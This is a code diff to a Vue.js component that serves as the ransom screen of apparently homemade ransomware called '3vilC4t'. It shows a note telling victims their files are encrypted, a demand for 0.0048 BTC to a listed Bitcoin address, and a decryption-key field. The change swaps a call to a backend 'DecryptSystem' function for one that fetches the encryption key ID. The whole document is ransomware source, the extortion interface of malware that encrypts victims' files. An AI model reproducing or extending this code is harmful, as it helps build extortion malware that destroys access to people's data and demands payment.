@@ -5,7 +5,8 @@
     <p :title="message2">{{message2}}</p>
     <p :title="address">{{address}}</p>
     <input type="text" id="decKey" name="decKey" v-model="decKey" placeholder="Decryption Key">
-    <a @click="beginDecryption">Decrypt</a>
+    <a @click="getKeyID">Decrypt</a>
+    <p>KeyID: {{keyID}}</p>
   </div>
 </template>
 
@@ -14,25 +15,19 @@ export default {
   data() {
     return {
       message: "You have been infected by 3vilC4t virus. Your files have been encrypted. Do not attempt to decrypt it on your own. It will cause irreversible damage.\n",
-      message2: "Pay the ransom to receive the decryption key. You only have 1 attempt.",
+      message2: "Pay the ransom to receive the decryption key. You have 1 attempt.",
       address: "0.0048 BTC to mjD6LE6rK9cGSrWmuTK5haFULEUUyceakf ",
       decKey: "",
-      userprofile: getRootDir,
+      keyID: "",
+      userprofile: "",
       test: ""
     };
   },
   methods: {
-    beginDecryption: function() {
+    getKeyID: function() {
       var self = this;
-      // TODO: Add the second arg to DecryptSystem
-      window.backend.DecryptSystem(self.userprofile, atob(decKey)).then(result => {
-        self.test = result
-      })
-    },
-    getRootDir: function() {
-      var self = this;
-      window.backend.osEnvWrapper().then(result => {
-        self.userprofile = result
+      window.backend.getEncryptionKeyWrapper().then(result => {
+        self.keyID = result
       })
     }
   }
